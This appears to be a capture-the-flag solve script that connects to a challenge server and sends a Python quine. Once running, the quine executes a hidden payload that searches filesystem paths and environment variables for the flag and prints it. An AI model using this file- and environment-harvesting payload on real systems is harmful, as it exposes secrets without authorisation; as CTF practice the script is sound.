#!/usr/bin/env python3
from pwn import remote

HOST = "chal.bearcatctf.io"
PORT = 31806


def build_one_liner_quine():
    t = (
        'paths=glob.glob("/flag*")+glob.glob("/app/flag*")+glob.glob("/srv/flag*")+glob.glob("/opt/flag*")+glob.glob("/home/*/flag*")+glob.glob("/home/*/*flag*")+glob.glob("/tmp/flag*");'
        'c=next((m.group(0) for d in ["|".join(os.environ.get(k,"") for k in ("FLAG","CTF_FLAG","BCCTF_FLAG","BEARCAT_FLAG"))]+[open(p,"r",errors="ignore").read() for p in paths if os.path.isfile(p) and os.access(p,4)] for m in [pat.search(d)] if m),"NOFLAG");'
        'print("\\n"+c)'
    )
    s = (
        'import os,sys,re,glob;'
        'pat=re.compile(r"BCCTF\\{[^}]+\\}");'
        f't={t!r};'
        's=%r;'
        'sys.stdout.write(s%%s);'
        '(globals().get("__file__","").startswith("/tmp/") or exec(t))'
    )
    return s % s


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")
    io.sendline(build_one_liner_quine().encode())
    io.interactive()


if __name__ == "__main__":
    main()
